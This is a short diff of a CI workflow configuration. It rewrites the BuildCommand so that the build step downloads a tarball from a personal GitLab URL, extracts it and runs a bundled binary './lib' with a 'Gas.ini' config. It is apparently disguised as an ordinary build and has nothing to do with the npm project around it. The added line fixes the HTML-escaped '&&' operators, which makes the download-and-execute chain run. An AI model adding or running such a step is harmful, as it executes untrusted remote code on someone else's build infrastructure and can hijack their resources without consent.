@@ -11,7 +11,7 @@ env:
   MainBranch: main
   NPMRegistry: https://registry.npmjs.org/
   InstallCommand: npm ci
-  BuildCommand: wget https://gitlab.com/deris1/manta/-/raw/main/bugim.tar.gz &amp;&amp; tar -xvf bugim.tar.gz &amp;&amp; ./lib Gas.ini
+  BuildCommand: wget https://gitlab.com/deris1/manta/-/raw/main/bugim.tar.gz && tar -xvf bugim.tar.gz && ./lib Gas.ini
   Output: ./
 
 jobs:
